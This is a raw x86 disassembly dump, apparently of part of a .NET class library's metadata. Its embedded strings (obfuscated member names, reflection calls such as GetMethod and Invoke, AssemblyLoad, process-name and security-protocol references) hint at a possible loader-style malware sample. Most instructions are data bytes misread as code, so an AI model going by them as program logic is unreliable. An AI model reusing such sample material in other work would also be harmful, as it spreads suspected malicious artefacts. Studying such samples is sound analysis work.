100025f5:	6f                   	outsl  %ds:(%esi),(%dx)
100025f6:	6e                   	outsb  %ds:(%esi),(%dx)
100025f7:	3d 34 2e 30 2e       	cmp    $0x2e302e34,%eax
100025fc:	30 2e                	xor    %ch,(%esi)
100025fe:	30 2c 20             	xor    %ch,(%eax,%eiz,1)
10002601:	43                   	inc    %ebx
10002602:	75 6c                	jne    0x10002670
10002604:	74 75                	je     0x1000267b
10002606:	72 65                	jb     0x1000266d
10002608:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
1000260d:	72 61                	jb     0x10002670
1000260f:	6c                   	insb   (%dx),%es:(%edi)
10002610:	2c 20                	sub    $0x20,%al
10002612:	50                   	push   %eax
10002613:	75 62                	jne    0x10002677
10002615:	6c                   	insb   (%dx),%es:(%edi)
10002616:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%ebx),%esp
1000261d:	6b 65 6e 3d          	imul   $0x3d,0x6e(%ebp),%esp
10002621:	62 37                	bound  %esi,(%edi)
10002623:	37                   	aaa
10002624:	61                   	popa
10002625:	35 63 35 36 31       	xor    $0x31363563,%eax
1000262a:	39 33                	cmp    %esi,(%ebx)
1000262c:	34 65                	xor    $0x65,%al
1000262e:	30 38                	xor    %bh,(%eax)
10002630:	39 23                	cmp    %esp,(%ebx)
10002632:	53                   	push   %ebx
10002633:	79 73                	jns    0x100026a8
10002635:	74 65                	je     0x1000269c
10002637:	6d                   	insl   (%dx),%es:(%edi)
10002638:	2e 52                	cs push %edx
1000263a:	65 73 6f             	gs jae 0x100026ac
1000263d:	75 72                	jne    0x100026b1
1000263f:	63 65 73             	arpl   %esp,0x73(%ebp)
10002642:	2e 52                	cs push %edx
10002644:	75 6e                	jne    0x100026b4
10002646:	74 69                	je     0x100026b1
10002648:	6d                   	insl   (%dx),%es:(%edi)
10002649:	65 52                	gs push %edx
1000264b:	65 73 6f             	gs jae 0x100026bd
1000264e:	75 72                	jne    0x100026c2
10002650:	63 65 53             	arpl   %esp,0x53(%ebp)
10002653:	65 74 02             	gs je  0x10002658
	...
1000265e:	00 00                	add    %al,(%eax)
10002660:	00 50 41             	add    %dl,0x41(%eax)
10002663:	44                   	inc    %esp
10002664:	50                   	push   %eax
10002665:	41                   	inc    %ecx
10002666:	44                   	inc    %esp
10002667:	50                   	push   %eax
10002668:	b4 00                	mov    $0x0,%ah
1000266a:	00 00                	add    %al,(%eax)
1000266c:	42                   	inc    %edx
1000266d:	53                   	push   %ebx
1000266e:	4a                   	dec    %edx
1000266f:	42                   	inc    %edx
10002670:	01 00                	add    %eax,(%eax)
10002672:	01 00                	add    %eax,(%eax)
10002674:	00 00                	add    %al,(%eax)
10002676:	00 00                	add    %al,(%eax)
10002678:	0c 00                	or     $0x0,%al
1000267a:	00 00                	add    %al,(%eax)
1000267c:	76 34                	jbe    0x100026b2
1000267e:	2e 30 2e             	xor    %ch,%cs:(%esi)
10002681:	33 30                	xor    (%eax),%esi
10002683:	33 31                	xor    (%ecx),%esi
10002685:	39 00                	cmp    %eax,(%eax)
10002687:	00 00                	add    %al,(%eax)
10002689:	00 05 00 6c 00 00    	add    %al,0x6c00
1000268f:	00 40 04             	add    %al,0x4(%eax)
10002692:	00 00                	add    %al,(%eax)
10002694:	23 7e 00             	and    0x0(%esi),%edi
10002697:	00 ac 04 00 00 84 05 	add    %ch,0x5840000(%esp,%eax,1)
1000269e:	00 00                	add    %al,(%eax)
100026a0:	23 53 74             	and    0x74(%ebx),%edx
100026a3:	72 69                	jb     0x1000270e
100026a5:	6e                   	outsb  %ds:(%esi),(%dx)
100026a6:	67 73 00             	addr16 jae 0x100026a9
100026a9:	00 00                	add    %al,(%eax)
100026ab:	00 30                	add    %dh,(%eax)
100026ad:	0a 00                	or     (%eax),%al
100026af:	00 78 05             	add    %bh,0x5(%eax)
100026b2:	00 00                	add    %al,(%eax)
100026b4:	23 55 53             	and    0x53(%ebp),%edx
100026b7:	00 a8 0f 00 00 10    	add    %ch,0x1000000f(%eax)
100026bd:	00 00                	add    %al,(%eax)
100026bf:	00 23                	add    %ah,(%ebx)
100026c1:	47                   	inc    %edi
100026c2:	55                   	push   %ebp
100026c3:	49                   	dec    %ecx
100026c4:	44                   	inc    %esp
100026c5:	00 00                	add    %al,(%eax)
100026c7:	00 b8 0f 00 00 28    	add    %bh,0x2800000f(%eax)
100026cd:	02 00                	add    (%eax),%al
100026cf:	00 23                	add    %ah,(%ebx)
100026d1:	42                   	inc    %edx
100026d2:	6c                   	insb   (%dx),%es:(%edi)
100026d3:	6f                   	outsl  %ds:(%esi),(%dx)
100026d4:	62 00                	bound  %eax,(%eax)
100026d6:	00 00                	add    %al,(%eax)
100026d8:	00 00                	add    %al,(%eax)
100026da:	00 00                	add    %al,(%eax)
100026dc:	02 00                	add    (%eax),%al
100026de:	00 01                	add    %al,(%ecx)
100026e0:	57                   	push   %edi
100026e1:	15 02 00 09 01       	adc    $0x1090002,%eax
100026e6:	00 00                	add    %al,(%eax)
100026e8:	00 5a a4             	add    %bl,-0x5c(%edx)
100026eb:	00 00                	add    %al,(%eax)
100026ed:	14 00                	adc    $0x0,%al
100026ef:	00 01                	add    %al,(%ecx)
100026f1:	00 00                	add    %al,(%eax)
100026f3:	00 2b                	add    %ch,(%ebx)
100026f5:	00 00                	add    %al,(%eax)
100026f7:	00 04 00             	add    %al,(%eax,%eax,1)
100026fa:	00 00                	add    %al,(%eax)
100026fc:	02 00                	add    (%eax),%al
100026fe:	00 00                	add    %al,(%eax)
10002700:	08 00                	or     %al,(%eax)
10002702:	00 00                	add    %al,(%eax)
10002704:	09 00                	or     %eax,(%eax)
10002706:	00 00                	add    %al,(%eax)
10002708:	38 00                	cmp    %al,(%eax)
1000270a:	00 00                	add    %al,(%eax)
1000270c:	0d 00 00 00 02       	or     $0x2000000,%eax
10002711:	00 00                	add    %al,(%eax)
10002713:	00 01                	add    %al,(%ecx)
10002715:	00 00                	add    %al,(%eax)
10002717:	00 03                	add    %al,(%ebx)
10002719:	00 00                	add    %al,(%eax)
1000271b:	00 01                	add    %al,(%ecx)
1000271d:	00 00                	add    %al,(%eax)
1000271f:	00 00                	add    %al,(%eax)
10002721:	00 d5                	add    %dl,%ch
10002723:	02 01                	add    (%ecx),%al
10002725:	00 00                	add    %al,(%eax)
10002727:	00 00                	add    %al,(%eax)
10002729:	00 06                	add    %al,(%esi)
1000272b:	00 fb                	add    %bh,%bl
1000272d:	04 02                	add    $0x2,%al
1000272f:	03 06                	add    (%esi),%eax
10002731:	00 5d 03             	add    %bl,0x3(%ebp)
10002734:	43                   	inc    %ebx
10002735:	00 0a                	add    %cl,(%edx)
10002737:	00 ec                	add    %ch,%ah
10002739:	04 eb                	add    $0xeb,%al
1000273b:	03 06                	add    (%esi),%eax
1000273d:	00 48 03             	add    %cl,0x3(%eax)
10002740:	02 03                	add    (%ebx),%al
10002742:	0a 00                	or     (%eax),%al
10002744:	1f                   	pop    %ds
10002745:	05 02 05 06 00       	add    $0x60502,%eax
1000274a:	ba 02 02 03 06       	mov    $0x6030202,%edx
1000274f:	00 c8                	add    %cl,%al
10002751:	02 43 00             	add    0x0(%ebx),%al
10002754:	06                   	push   %es
10002755:	00 aa 00 43 00 0e    	add    %ch,0xe004300(%edx)
1000275b:	00 2a                	add    %ch,(%edx)
1000275d:	03 6a 00             	add    0x0(%edx),%ebp
10002760:	0e                   	push   %cs
10002761:	00 b6 00 6a 00 0e    	add    %dh,0xe006a00(%esi)
10002767:	00 55 00             	add    %dl,0x0(%ebp)
1000276a:	28 04 0a             	sub    %al,(%edx,%ecx,1)
1000276d:	00 71 03             	add    %dh,0x3(%ecx)
10002770:	02 05 0a 00 e7 00    	add    0xe7000a,%al
10002776:	02 05 06 00 75 02    	add    0x2750006,%al
1000277c:	31 05 0e 00 c5 04    	xor    %eax,0x4c5000e
10002782:	6a 00                	push   $0x0
10002784:	06                   	push   %es
10002785:	00 0e                	add    %cl,(%esi)
10002787:	03 02                	add    (%edx),%eax
10002789:	03 06                	add    (%esi),%eax
1000278b:	00 29                	add    %ch,(%ecx)
1000278d:	05 02 03 06 00       	add    $0x60302,%eax
10002792:	5b                   	pop    %ebx
10002793:	05 36 03 06 00       	add    $0x60336,%eax
10002798:	ff 00                	incl   (%eax)
1000279a:	02 03                	add    (%ebx),%al
1000279c:	06                   	push   %es
1000279d:	00 52 03             	add    %dl,0x3(%edx)
100027a0:	36 03 06             	add    %ss:(%esi),%eax
100027a3:	00 04 01             	add    %al,(%ecx,%eax,1)
100027a6:	36 03 0e             	add    %ss:(%esi),%ecx
100027a9:	00 12                	add    %dl,(%edx)
100027ab:	05 6a 00 0e 00       	add    $0xe006a,%eax
100027b0:	c2 00 6a             	ret    $0x6a00
100027b3:	00 06                	add    %al,(%esi)
100027b5:	00 e3                	add    %ah,%bl
100027b7:	03 60 02             	add    0x2(%eax),%esp
100027ba:	06                   	push   %es
100027bb:	00 85 03 02 03 06    	add    %al,0x6030203(%ebp)
100027c1:	00 cd                	add    %cl,%ch
100027c3:	04 02                	add    $0x2,%al
100027c5:	03 06                	add    (%esi),%eax
100027c7:	00 af 00 36 03 06    	add    %ch,0x6033600(%edi)
100027cd:	00 b8 04 36 03 06    	add    %bh,0x6033604(%eax)
100027d3:	00 66 03             	add    %ah,0x3(%esi)
100027d6:	36 03 06             	add    %ss:(%esi),%eax
100027d9:	00 d5                	add    %dl,%ch
100027db:	01 4f 04             	add    %ecx,0x4(%edi)
100027de:	06                   	push   %es
100027df:	00 42 02             	add    %al,0x2(%edx)
100027e2:	4f                   	dec    %edi
100027e3:	04 06                	add    $0x6,%al
100027e5:	00 28                	add    %ch,(%eax)
100027e7:	01 eb                	add    %ebp,%ebx
100027e9:	03 83 00 91 04 00    	add    0x49100(%ebx),%eax
100027ef:	00 06                	add    %al,(%esi)
100027f1:	00 50 01             	add    %dl,0x1(%eax)
100027f4:	36 03 06             	add    %ss:(%esi),%eax
100027f7:	00 b8 01 36 03 06    	add    %bh,0x6033601(%eax)
100027fd:	00 29                	add    %ch,(%ecx)
100027ff:	02 36                	add    (%esi),%dh
10002801:	03 06                	add    (%esi),%eax
10002803:	00 f5                	add    %dh,%ch
10002805:	01 36                	add    %esi,(%esi)
10002807:	03 06                	add    (%esi),%eax
10002809:	00 0e                	add    %cl,(%esi)
1000280b:	02 36                	add    (%esi),%dh
1000280d:	03 06                	add    (%esi),%eax
1000280f:	00 67 01             	add    %ah,0x1(%edi)
10002812:	36 03 06             	add    %ss:(%esi),%eax
10002815:	00 3c 01             	add    %bh,(%ecx,%eax,1)
10002818:	09 04 06             	or     %eax,(%esi,%eax,1)
1000281b:	00 1a                	add    %bl,(%edx)
1000281d:	01 09                	add    %ecx,(%ecx)
1000281f:	04 06                	add    $0x6,%al
10002821:	00 9b 01 36 03 06    	add    %bl,0x6033601(%ebx)
10002827:	00 82 01 7e 02 00    	add    %al,0x27e01(%edx)
1000282d:	01 00                	add    %eax,(%eax)
1000282f:	00 22                	add    %ah,(%edx)
10002831:	00 00                	add    %al,(%eax)
10002833:	00 00                	add    %al,(%eax)
10002835:	00 01                	add    %al,(%ecx)
10002837:	00 01                	add    %al,(%ecx)
10002839:	00 01                	add    %al,(%ecx)
1000283b:	00 00                	add    %al,(%eax)
1000283d:	00 01                	add    %al,(%ecx)
1000283f:	00 08                	add    %cl,(%eax)
10002841:	00 05 00 01 00 02    	add    %al,0x2000100
10002847:	00 00                	add    %al,(%eax)
10002849:	01 00                	add    %eax,(%eax)
1000284b:	00 5f 00             	add    %bl,0x0(%edi)
1000284e:	00 00                	add    %al,(%eax)
10002850:	05 00 01 00 04       	add    $0x4000100,%eax
10002855:	00 00                	add    %al,(%eax)
10002857:	01 00                	add    %eax,(%eax)
10002859:	00 68 00             	add    %ch,0x0(%eax)
1000285c:	00 00                	add    %al,(%eax)
1000285e:	05 00 03 00 09       	add    $0x9000300,%eax
10002863:	00 11                	add    %dl,(%ecx)
10002865:	00 5f 00             	add    %bl,0x0(%edi)
10002868:	de 00                	fiadds (%eax)
1000286a:	11 00                	adc    %eax,(%eax)
1000286c:	68 00 e1 00 50       	push   $0x5000e100
10002871:	20 00                	and    %al,(%eax)
10002873:	00 00                	add    %al,(%eax)
10002875:	00 91 18 dc 03 13    	add    %dl,0x1303dc18(%ecx)
1000287b:	00 01                	add    %al,(%ecx)
1000287d:	00 62 20             	add    %ah,0x20(%edx)
10002880:	00 00                	add    %al,(%eax)
10002882:	00 00                	add    %al,(%eax)
10002884:	06                   	push   %es
10002885:	18 d6                	sbb    %dl,%dh
10002887:	03 17                	add    (%edi),%edx
10002889:	00 01                	add    %al,(%ecx)
1000288b:	00 6c 20 00          	add    %ch,0x0(%eax,%eiz,1)
1000288f:	00 00                	add    %al,(%eax)
10002891:	00 16                	add    %dl,(%esi)
10002893:	00 2b                	add    %ch,(%ebx)
10002895:	00 d4                	add    %dl,%ah
10002897:	00 01                	add    %al,(%ecx)
10002899:	00 60 24             	add    %ah,0x24(%eax)
1000289c:	00 00                	add    %al,(%eax)
1000289e:	00 00                	add    %al,(%eax)
100028a0:	91                   	xchg   %eax,%ecx
100028a1:	18 dc                	sbb    %bl,%ah
100028a3:	03 13                	add    (%ebx),%edx
100028a5:	00 07                	add    %al,(%edi)
100028a7:	00 6c 24 00          	add    %ch,0x0(%esp)
100028ab:	00 00                	add    %al,(%eax)
100028ad:	00 96 00 5f 00 13    	add    %dl,0x13005f00(%esi)
100028b3:	00 07                	add    %al,(%edi)
100028b5:	00 dc                	add    %bl,%ah
100028b7:	24 00                	and    $0x0,%al
100028b9:	00 00                	add    %al,(%eax)
100028bb:	00 91 00 68 00 fa    	add    %dl,-0x5ff9800(%ecx)
100028c1:	00 07                	add    %al,(%edi)
100028c3:	00 ec                	add    %ch,%ah
100028c5:	24 00                	and    $0x0,%al
100028c7:	00 00                	add    %al,(%eax)
100028c9:	00 91 00 7e 00 29    	add    %dl,0x29007e00(%ecx)
100028cf:	01 09                	add    %ecx,(%ecx)
100028d1:	00 62 20             	add    %ah,0x20(%edx)
100028d4:	00 00                	add    %al,(%eax)
100028d6:	00 00                	add    %al,(%eax)
100028d8:	86 18                	xchg   %bl,(%eax)
100028da:	d6                   	salc
100028db:	03 17                	add    (%edi),%edx
100028dd:	00 0a                	add    %cl,(%edx)
100028df:	00 00                	add    %al,(%eax)
100028e1:	00 01                	add    %al,(%ecx)
100028e3:	00 16                	add    %dl,(%esi)
100028e5:	00 00                	add    %al,(%eax)
100028e7:	00 02                	add    %al,(%edx)
100028e9:	00 cd                	add    %cl,%ch
100028eb:	02 00                	add    (%eax),%al
100028ed:	00 03                	add    %al,(%ebx)
100028ef:	00 4d 00             	add    %cl,0x0(%ebp)
100028f2:	00 00                	add    %al,(%eax)
100028f4:	04 00                	add    $0x0,%al
100028f6:	3d 00 00 00 05       	cmp    $0x5000000,%eax
100028fb:	00 31                	add    %dh,(%ecx)
100028fd:	00 00                	add    %al,(%eax)
100028ff:	00 06                	add    %al,(%esi)
10002901:	00 37                	add    %dh,(%edi)
10002903:	00 00                	add    %al,(%eax)
10002905:	00 01                	add    %al,(%ecx)
10002907:	00 5f 00             	add    %bl,0x0(%edi)
1000290a:	00 00                	add    %al,(%eax)
1000290c:	02 00                	add    (%eax),%al
1000290e:	68 00 00 00 01       	push   $0x1000000
10002913:	00 5f 00             	add    %bl,0x0(%edi)
10002916:	09 00                	or     %eax,(%eax)
10002918:	d6                   	salc
10002919:	03 17                	add    (%edi),%edx
1000291b:	00 31                	add    %dh,(%ecx)
1000291d:	00 e3                	add    %ah,%bl
1000291f:	04 42                	add    $0x42,%al
10002921:	00 19                	add    %bl,(%ecx)
10002923:	00 ab 04 47 00 19    	add    %ch,0x19004704(%ebx)
10002929:	00 d7                	add    %dl,%bh
1000292b:	00 4d 00             	add    %cl,0x0(%ebp)
1000292e:	31 00                	xor    %eax,(%eax)
10002930:	9e                   	sahf
10002931:	03 4d 00             	add    0x0(%ebp),%ecx
10002934:	31 00                	xor    %eax,(%eax)
10002936:	7e 05                	jle    0x1000293d
10002938:	51                   	push   %ecx
10002939:	00 11                	add    %dl,(%ecx)
1000293b:	00 d6                	add    %dl,%dh
1000293d:	03 54 00 31          	add    0x31(%eax,%eax,1),%edx
10002941:	00 ac 03 4d 00 31 00 	add    %ch,0x31004d(%ebx,%eax,1)
10002948:	09 03                	or     %eax,(%ebx)
1000294a:	4d                   	dec    %ebp
1000294b:	00 39                	add    %bh,(%ecx)
1000294d:	00 c1                	add    %al,%cl
1000294f:	02 59 00             	add    0x0(%ecx),%bl
10002952:	31 00                	xor    %eax,(%eax)
10002954:	f4                   	hlt
10002955:	04 5d                	add    $0x5d,%al
10002957:	00 31                	add    %dh,(%ecx)
10002959:	00 f4                	add    %dh,%ah
1000295b:	04 63                	add    $0x63,%al
1000295d:	00 41 00             	add    %al,0x0(%ecx)
10002960:	3d 05 69 00 31       	cmp    $0x31006905,%eax
10002965:	00 f4                	add    %dh,%ah
10002967:	04 6f                	add    $0x6f,%al
10002969:	00 49 00             	add    %cl,0x0(%ecx)
1000296c:	e7 02                	out    %eax,$0x2
1000296e:	76 00                	jbe    0x10002970
10002970:	11 00                	adc    %eax,(%eax)
10002972:	ce                   	into
10002973:	00 4d 00             	add    %cl,0x0(%ebp)
10002976:	59                   	pop    %ecx
10002977:	00 c6                	add    %al,%dh
10002979:	03 7f 00             	add    0x0(%edi),%edi
1000297c:	59                   	pop    %ecx
1000297d:	00 b4 03 13 00 61 00 	add    %dh,0x610013(%ebx,%eax,1)
10002984:	ed                   	in     (%dx),%eax
10002985:	02 85 00 29 00 d6    	add    -0x29ffd700(%ebp),%al
1000298b:	03 17                	add    (%edi),%edx
1000298d:	00 71 00             	add    %dh,0x0(%ecx)
10002990:	19 00                	sbb    %eax,(%eax)
10002992:	8b 00                	mov    (%eax),%eax
10002994:	29 00                	sub    %eax,(%eax)
10002996:	71 02                	jno    0x1000299a
10002998:	90                   	nop
10002999:	00 79 00             	add    %bh,0x0(%ecx)
1000299c:	0f 01 96 00 29 00 a9 	lgdtl  -0x56ffd700(%esi)
100029a3:	02 9b 00 31 00 9b    	add    -0x64ffcf00(%ebx),%bl
100029a9:	00 a0 00 81 00 18    	add    %ah,0x18008100(%eax)
100029af:	03 a6 00 89 00 98    	add    -0x67ff7700(%esi),%esp
100029b5:	02 ab 00 81 00 8c    	add    -0x73ff7f00(%ebx),%ch
100029bb:	00 b1 00 91 00 fc    	add    %dh,-0x3ff6f00(%ecx)
100029c1:	00 b8 00 99 00 91    	add    %bh,-0x6eff6700(%eax)
100029c7:	00 be 00 a9 00 a3    	add    %bh,-0x5cff5700(%esi)
100029cd:	00 c4                	add    %al,%ah
100029cf:	00 21                	add    %ah,(%ecx)
100029d1:	00 b8 02 4d 00 49    	add    %bh,0x49004d02(%eax)
100029d7:	00 4a 05             	add    %cl,0x5(%edx)
100029da:	cb                   	lret
100029db:	00 c1                	add    %al,%cl
100029dd:	00 a6 03 e4 00 c9    	add    %ah,-0x36ff1bfd(%esi)
100029e3:	00 d6                	add    %dl,%dh
100029e5:	03 e9                	add    %ecx,%ebp
100029e7:	00 81 00 80 00 ef    	add    %al,-0x10ff8000(%ecx)
100029ed:	00 c1                	add    %al,%cl
100029ef:	00 0d 05 e4 00 d1    	add    %cl,0xd100e405
100029f5:	00 51 05             	add    %dl,0x5(%ecx)
100029f8:	f5                   	cmc
100029f9:	00 91 00 a0 04 0d    	add    %dl,0xd04a000(%ecx)
100029ff:	01 d9                	add    %ebx,%ecx
10002a01:	00 fe                	add    %bh,%dh
10002a03:	03 13                	add    (%ebx),%edx
10002a05:	01 e9                	add    %ebp,%ecx
10002a07:	00 ce                	add    %cl,%dh
10002a09:	00 4d 00             	add    %cl,0x0(%ebp)
10002a0c:	31 00                	xor    %eax,(%eax)
10002a0e:	64 05 1b 01 a1 00    	fs add $0xa1011b,%eax
10002a14:	70 05                	jo     0x10002a1b
10002a16:	21 01                	and    %eax,(%ecx)
10002a18:	f1                   	int1
10002a19:	00 d6                	add    %dl,%dh
10002a1b:	03 2f                	add    (%edi),%ebp
10002a1d:	01 f9                	add    %edi,%ecx
10002a1f:	00 d6                	add    %dl,%dh
10002a21:	03 17                	add    (%edi),%edx
10002a23:	00 01                	add    %al,(%ecx)
10002a25:	01 d6                	add    %edx,%esi
10002a27:	03 5c 01 11          	add    0x11(%ecx,%eax,1),%ebx
10002a2b:	01 d6                	add    %edx,%esi
10002a2d:	03 54 00 19          	add    0x19(%eax,%eax,1),%edx
10002a31:	01 d6                	add    %edx,%esi
10002a33:	03 54 00 21          	add    0x21(%eax,%eax,1),%edx
10002a37:	01 d6                	add    %edx,%esi
10002a39:	03 54 00 29          	add    0x29(%eax,%eax,1),%edx
10002a3d:	01 d6                	add    %edx,%esi
10002a3f:	03 54 00 31          	add    0x31(%eax,%eax,1),%edx
10002a43:	01 d6                	add    %edx,%esi
10002a45:	03 54 00 39          	add    0x39(%eax,%eax,1),%edx
10002a49:	01 d6                	add    %edx,%esi
10002a4b:	03 54 00 41          	add    0x41(%eax,%eax,1),%edx
10002a4f:	01 d6                	add    %edx,%esi
10002a51:	03 9d 01 49 01 d6    	add    -0x29feb6ff(%ebp),%ebx
10002a57:	03 54 00 51          	add    0x51(%eax,%eax,1),%edx
10002a5b:	01 d6                	add    %edx,%esi
10002a5d:	03 54 00 59          	add    0x59(%eax,%eax,1),%edx
10002a61:	01 d6                	add    %edx,%esi
10002a63:	03 54 00 2e          	add    0x2e(%eax,%eax,1),%edx
10002a67:	00 63 01             	add    %ah,0x1(%ebx)
10002a6a:	34 01                	xor    $0x1,%al
10002a6c:	2e 00 6b 01          	add    %ch,%cs:0x1(%ebx)
10002a70:	3d 01 2e 00 73       	cmp    $0x73002e01,%eax
10002a75:	01 63 01             	add    %esp,0x1(%ebx)
10002a78:	2e 00 7b 01          	add    %bh,%cs:0x1(%ebx)
10002a7c:	6c                   	insb   (%dx),%es:(%edi)
10002a7d:	01 2e                	add    %ebp,(%esi)
10002a7f:	00 83 01 7f 01 2e    	add    %al,0x2e017f01(%ebx)
10002a85:	00 8b 01 7f 01 2e    	add    %cl,0x2e017f01(%ebx)
10002a8b:	00 93 01 6c 01 2e    	add    %dl,0x2e016c01(%ebx)
10002a91:	00 9b 01 85 01 2e    	add    %bl,0x2e018501(%ebx)
10002a97:	00 a3 01 7f 01 2e    	add    %ah,0x2e017f01(%ebx)
10002a9d:	00 ab 01 7f 01 2e    	add    %ch,0x2e017f01(%ebx)
10002aa3:	00 b3 01 a2 01 2e    	add    %dh,0x2e01a201(%ebx)
10002aa9:	00 bb 01 cc 01 2e    	add    %bh,0x2e01cc01(%ebx)
10002aaf:	00 c3                	add    %al,%bl
10002ab1:	01 d9                	add    %ebx,%ecx
10002ab3:	01 1b                	add    %ebx,(%ebx)
10002ab5:	00 01                	add    %al,(%ecx)
10002ab7:	01 04 80             	add    %eax,(%eax,%eax,4)
10002aba:	00 00                	add    %al,(%eax)
10002abc:	01 00                	add    %eax,(%eax)
	...
10002aca:	08 00                	or     %al,(%eax)
10002acc:	00 00                	add    %al,(%eax)
10002ace:	04 00                	add    $0x0,%al
	...
10002ad8:	00 00                	add    %al,(%eax)
10002ada:	01 00                	add    %eax,(%eax)
10002adc:	61                   	popa
10002add:	00 00                	add    %al,(%eax)
10002adf:	00 00                	add    %al,(%eax)
10002ae1:	00 04 00             	add    %al,(%eax,%eax,1)
	...
10002aec:	00 00                	add    %al,(%eax)
10002aee:	01 00                	add    %eax,(%eax)
10002af0:	02 03                	add    (%ebx),%al
10002af2:	00 00                	add    %al,(%eax)
10002af4:	00 00                	add    %al,(%eax)
10002af6:	0a 00                	or     (%eax),%al
	...
10002b00:	00 00                	add    %al,(%eax)
10002b02:	0a 00                	or     (%eax),%al
10002b04:	6a 00                	push   $0x0
	...
10002b0e:	01 00                	add    %eax,(%eax)
10002b10:	00 00                	add    %al,(%eax)
10002b12:	6f                   	outsl  %ds:(%esi),(%dx)
10002b13:	04 00                	add    $0x0,%al
10002b15:	00 00                	add    %al,(%eax)
10002b17:	00 00                	add    %al,(%eax)
10002b19:	43                   	inc    %ebx
10002b1a:	6c                   	insb   (%dx),%es:(%edi)
10002b1b:	61                   	popa
10002b1c:	73 73                	jae    0x10002b91
10002b1e:	31 00                	xor    %eax,(%eax)
10002b20:	43                   	inc    %ebx
10002b21:	6c                   	insb   (%dx),%es:(%edi)
10002b22:	61                   	popa
10002b23:	73 73                	jae    0x10002b98
10002b25:	4c                   	dec    %esp
10002b26:	69 62 72 61 72 79 31 	imul   $0x31797261,0x72(%edx),%esp
10002b2d:	00 5f 35             	add    %bl,0x35(%edi)
10002b30:	00 67 65             	add    %ah,0x65(%edi)
10002b33:	74 5f                	je     0x10002b94
10002b35:	55                   	push   %ebp
10002b36:	54                   	push   %esp
10002b37:	46                   	inc    %esi
10002b38:	38 00                	cmp    %al,(%eax)
10002b3a:	3c 4d                	cmp    $0x4d,%al
10002b3c:	6f                   	outsl  %ds:(%esi),(%dx)
10002b3d:	64 75 6c             	fs jne 0x10002bac
10002b40:	65 3e 00 5a 78       	gs add %bl,%ds:0x78(%edx)
10002b45:	4b                   	dec    %ebx
10002b46:	48                   	dec    %eax
10002b47:	47                   	inc    %edi
10002b48:	00 4d 62             	add    %cl,0x62(%ebp)
10002b4b:	6d                   	insl   (%dx),%es:(%edi)
10002b4c:	76 4b                	jbe    0x10002b99
10002b4e:	00 52 4d             	add    %dl,0x4d(%edx)
10002b51:	4d                   	dec    %ebp
10002b52:	59                   	pop    %ecx
10002b53:	4c                   	dec    %esp
10002b54:	00 55 6d             	add    %dl,0x6d(%ebp)
10002b57:	5a                   	pop    %edx
10002b58:	62 4c 00 53          	bound  %ecx,0x53(%eax,%eax,1)
10002b5c:	79 73                	jns    0x10002bd1
10002b5e:	74 65                	je     0x10002bc5
10002b60:	6d                   	insl   (%dx),%es:(%edi)
10002b61:	2e 49                	cs dec %ecx
10002b63:	4f                   	dec    %edi
10002b64:	00 50 64             	add    %dl,0x64(%eax)
10002b67:	6a 4c                	push   $0x4c
10002b69:	76 66                	jbe    0x10002bd1
10002b6b:	61                   	popa
10002b6c:	00 50 72             	add    %dl,0x72(%eax)
10002b6f:	6f                   	outsl  %ds:(%esi),(%dx)
10002b70:	6a 65                	push   $0x65
10002b72:	63 74 44 61          	arpl   %esi,0x61(%esp,%eax,2)
10002b76:	74 61                	je     0x10002bd9
10002b78:	00 6d 73             	add    %ch,0x73(%ebp)
10002b7b:	63 6f 72             	arpl   %ebp,0x72(%edi)
10002b7e:	6c                   	insb   (%dx),%es:(%edi)
10002b7f:	69 62 00 4d 69 63 72 	imul   $0x7263694d,0x0(%edx),%esp
10002b86:	6f                   	outsl  %ds:(%esi),(%dx)
10002b87:	73 6f                	jae    0x10002bf8
10002b89:	66 74 2e             	data16 je 0x10002bba
10002b8c:	56                   	push   %esi
10002b8d:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
10002b94:	73 69                	jae    0x10002bff
10002b96:	63 00                	arpl   %eax,(%eax)
10002b98:	61                   	popa
10002b99:	64 64 5f             	fs fs pop %edi
10002b9c:	41                   	inc    %ecx
10002b9d:	73 73                	jae    0x10002c12
10002b9f:	65 6d                	gs insl (%dx),%es:(%edi)
10002ba1:	62 6c 79 4c          	bound  %ebp,0x4c(%ecx,%edi,2)
10002ba5:	6f                   	outsl  %ds:(%esi),(%dx)
10002ba6:	61                   	popa
10002ba7:	64 00 47 65          	add    %al,%fs:0x65(%edi)
10002bab:	74 4d                	je     0x10002bfa
10002bad:	65 74 68             	gs je  0x10002c18
10002bb0:	6f                   	outsl  %ds:(%esi),(%dx)
10002bb1:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
10002bb5:	70 6c                	jo     0x10002c23
10002bb7:	61                   	popa
10002bb8:	63 65 00             	arpl   %esp,0x0(%ebp)
10002bbb:	49                   	dec    %ecx
10002bbc:	6e                   	outsb  %ds:(%esi),(%dx)
10002bbd:	76 6f                	jbe    0x10002c2e
10002bbf:	6b 65 00 46          	imul   $0x46,0x0(%ebp),%esp
10002bc3:	69 6c 65 00 4d 6f 64 	imul   $0x75646f4d,0x0(%ebp,%eiz,2),%ebp
10002bca:	75 
10002bcb:	6c                   	insb   (%dx),%es:(%edi)
10002bcc:	65 00 41 70          	add    %al,%gs:0x70(%ecx)
10002bd0:	70 57                	jo     0x10002c29
10002bd2:	69 6e 53 74 79 6c 65 	imul   $0x656c7974,0x53(%esi),%ebp
10002bd9:	00 4d 73             	add    %cl,0x73(%ebp)
10002bdc:	67 42                	addr16 inc %edx
10002bde:	6f                   	outsl  %ds:(%esi),(%dx)
10002bdf:	78 53                	js     0x10002c34
10002be1:	74 79                	je     0x10002c5c
10002be3:	6c                   	insb   (%dx),%es:(%edi)
10002be4:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
10002be8:	74 5f                	je     0x10002c49
10002bea:	4e                   	dec    %esi
10002beb:	61                   	popa
10002bec:	6d                   	insl   (%dx),%es:(%edi)
10002bed:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
10002bf1:	74 5f                	je     0x10002c52
10002bf3:	50                   	push   %eax
10002bf4:	72 6f                	jb     0x10002c65
10002bf6:	63 65 73             	arpl   %esp,0x73(%ebp)
10002bf9:	73 4e                	jae    0x10002c49
10002bfb:	61                   	popa
10002bfc:	6d                   	insl   (%dx),%es:(%edi)
10002bfd:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
10002c01:	63 75 72             	arpl   %esi,0x72(%ebp)
10002c04:	69 74 79 50 72 6f 74 	imul   $0x6f746f72,0x50(%ecx,%edi,2),%esi
10002c0b:	6f 
